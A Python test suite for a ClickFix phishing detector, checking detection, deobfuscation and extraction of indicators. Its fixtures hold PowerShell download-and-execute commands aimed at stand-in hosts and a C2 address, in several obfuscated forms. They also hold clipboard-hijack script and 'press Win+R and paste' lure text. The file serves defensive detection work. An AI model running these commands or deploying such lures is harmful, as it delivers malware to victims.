#!/usr/bin/env python3
"""Tests del motor ClickFix (deteccion, desofuscado y extraccion de IoCs)."""

import base64
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))

from clickfix_decoder import (  # noqa: E402
    analyze_clickfix,
    deobfuscate_layers,
    extract_clickfix_features,
    extract_indicators,
    get_clickfix_score,
)


def _ps_b64(command: str) -> str:
    return base64.b64encode(command.encode("utf-16-le")).decode("ascii")


BENIGN_HTML = (
    "<html><body><table><tr><td>Hola equipo, reunion el martes a las 10."
    "</td></tr></table></body></html>"
)


class TestDetection:
    def test_empty_input(self):
        result = analyze_clickfix("")
        assert result["clickfix_detected"] is False
        assert result["clickfix_score"] == 0.0

    def test_benign_html_low_signal(self):
        result = analyze_clickfix(BENIGN_HTML)
        assert result["clickfix_detected"] is False
        assert result["high_confidence"] is False

    def test_clipboard_api_detected(self):
        html = "<script>navigator.clipboard.writeText('powershell -c calc');</script>"
        result = analyze_clickfix(html)
        assert "clipboard_api" in result["techniques"]
        assert result["clickfix_score"] > 0

    def test_execcommand_and_hidden_textarea(self):
        html = (
            "<textarea id=x style='display:none'>powershell -c calc</textarea>"
            "<script>document.getElementById('x').select();"
            "document.execCommand('copy');</script>"
        )
        result = analyze_clickfix(html)
        assert "exec_command_copy" in result["techniques"]
        assert "hidden_copy_widget" in result["techniques"]

    def test_lure_phrases_and_win_r(self):
        html = "<p>Verify you are human. Press Win+R and paste the command.</p>"
        result = analyze_clickfix(html)
        assert result["has_win_r"] is True
        assert result["lure_phrases"]

    def test_plain_text_lure_detected(self):
        result = analyze_clickfix("", "Win+R y pega el comando en PowerShell")
        assert result["clickfix_detected"] is True


class TestDeobfuscation:
    def test_encoded_command_utf16le(self):
        command = "IEX (iwr 'http://clickfix.example.com/p.ps1')"
        html = "<pre>powershell -enc %s</pre>" % _ps_b64(command)
        result = analyze_clickfix(html)
        assert result["has_encoded_command"] is True
        assert any("clickfix.example.com" in c for c in result["decoded_commands"])
        assert "http://clickfix.example.com/p.ps1" in result["payload_urls"]

    def test_fromcharcode(self):
        command = "powershell -c IEX (iwr 'http://203.0.113.10/c2.ps1')"
        payload = ",".join(str(ord(ch)) for ch in command)
        html = "<script>String.fromCharCode(%s);</script>" % payload
        result = analyze_clickfix(html)
        assert result["payload_urls"] == ["http://203.0.113.10/c2.ps1"]
        assert "203.0.113.10" in result["payload_ips"]

    def test_atob(self):
        command = "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/a')"
        encoded = base64.b64encode(command.encode()).decode()
        html = "<script>eval(atob('%s'))</script>" % encoded
        result = analyze_clickfix(html)
        assert "http://evil.example.com/a" in result["payload_urls"]

    def test_concatenation(self):
        html = (
            "<textarea>powershell -c IEX(iwr 'http://'+'evil.example.com'+"
            "'/p.ps1')</textarea>"
            "<script>document.execCommand('copy');</script>"
        )
        result = analyze_clickfix(html)
        assert "http://evil.example.com/p.ps1" in result["payload_urls"]

    def test_escape_decoding(self):
        layers = deobfuscate_layers(r"powershell -c \x63\x61\x6c\x63")
        assert any("calc" in layer for layer in layers)

    def test_layers_never_include_input(self):
        text = "powershell -enc %s" % _ps_b64("Write-Host POC")
        assert text not in deobfuscate_layers(text)


class TestStaticStringReconstruction:
    def test_url_split_across_js_variables(self):
        html = (
            "<script>var a='http://evil.ex';var b='ample.com/d.ps1';"
            "navigator.clipboard.writeText(a+b);</script>"
        )
        result = analyze_clickfix(html)
        assert result["clickfix_detected"] is True
        assert "http://evil.example.com/d.ps1" in result["payload_urls"]
        assert "string_assembly" in result["techniques"]

    def test_fromcharcode_with_separate_array(self):
        codes = ",".join(str(ord(c)) for c in "http://evil.example.com/e.ps1")
        html = (
            "<script>var arr=[%s];"
            "navigator.clipboard.writeText("
            "String.fromCharCode.apply(null,arr));</script>" % codes
        )
        result = analyze_clickfix(html)
        assert "http://evil.example.com/e.ps1" in result["payload_urls"]

    def test_powershell_char_sequence(self):
        url = "http://evil.example.com/f.ps1"
        seq = "+".join("[char]%d" % ord(ch) for ch in url)
        html = (
            "<pre>powershell -c %s | IEX</pre>"
            "<script>document.execCommand('copy');</script>" % seq
        )
        result = analyze_clickfix(html)
        assert "http://evil.example.com/f.ps1" in result["payload_urls"]

    def test_variable_concat_with_atob(self):
        encoded = base64.b64encode(b"http://evil.example.com/g.ps1").decode()
        html = (
            "<script>var c='%s';"
            "navigator.clipboard.writeText(atob(c));</script>" % encoded
        )
        result = analyze_clickfix(html)
        assert "http://evil.example.com/g.ps1" in result["payload_urls"]

    def test_benign_numeric_variables_not_flagged(self):
        html = "<script>var total=a+b;var x='hola mundo';</script>"
        result = analyze_clickfix(html)
        assert result["clickfix_detected"] is False
        assert "string_assembly" not in result["techniques"]

    def test_benign_win_r_mention_not_flagged(self):
        html = "<p>Atajo: pulsa Win+R para abrir Ejecutar y escribe cmd</p>"
        result = analyze_clickfix(html)
        assert result["clickfix_detected"] is False

    def test_assembly_alone_reaches_threshold(self):
        html = (
            "<script>var a='http://evil.ex';var b='ample.com/d.ps1';"
            "navigator.clipboard.writeText(a+b);</script>"
        )
        result = analyze_clickfix(html)
        assert result["clickfix_score"] >= 0.5


class TestIndicators:
    def test_urls_and_domains(self):
        ind = extract_indicators("goto http://evil.example.com/a and https://x.tk/b")
        assert "http://evil.example.com/a" in ind["urls"]
        assert "evil.example.com" in ind["domains"]
        assert "x.tk" in ind["domains"]

    def test_defanged_url(self):
        ind = extract_indicators("hxxp://malicious[.]example[.]com/payload")
        assert ind["urls"] == ["http://malicious.example.com/payload"]

    def test_ipv4(self):
        ind = extract_indicators("connect 192.168.1.50:8080 now")
        assert "192.168.1.50" in ind["ips"]

    def test_file_extension_not_domain(self):
        ind = extract_indicators("run payload.exe and script.ps1")
        assert ind["domains"] == []

    def test_dotnet_namespace_not_domain(self):
        ind = extract_indicators(
            "New-Object Net.WebClient; System.IO.File; "
            "navigator.clipboard.writeText"
        )
        assert ind["domains"] == []


class TestFeatures:
    def test_feature_keys(self):
        command = "IEX (iwr 'http://clickfix.example.com/p.ps1')"
        html = "<pre>powershell -enc %s</pre>" % _ps_b64(command)
        result = analyze_clickfix(html)
        feats = extract_clickfix_features(result)
        for key in (
            "clanker_clickfix_detected",
            "clanker_clickfix_high_confidence",
            "clanker_clickfix_score",
            "clanker_clickfix_decoded_command_count",
            "clanker_clickfix_payload_url_count",
            "clanker_clickfix_has_encoded_command",
        ):
            assert key in feats
        assert feats["clanker_clickfix_detected"] == 1
        assert feats["clanker_clickfix_high_confidence"] == 1
        assert feats["clanker_clickfix_payload_url_count"] >= 1

    def test_features_none_safe(self):
        feats = extract_clickfix_features(None)
        assert feats["clanker_clickfix_detected"] == 0
        assert feats["clanker_clickfix_score"] == 0.0

    def test_get_score(self):
        assert get_clickfix_score(BENIGN_HTML) < 0.5

    def test_html_attachment_analyzed(self):
        command = "IEX (iwr 'http://clickfix.example.com/p.ps1')"
        attachment = {
            "filename": "invoice.html",
            "content": "<pre>powershell -enc %s</pre>" % _ps_b64(command),
        }
        result = analyze_clickfix("", "", [attachment])
        assert result["source_attachments"] == ["invoice.html"]
        assert "http://clickfix.example.com/p.ps1" in result["payload_urls"]
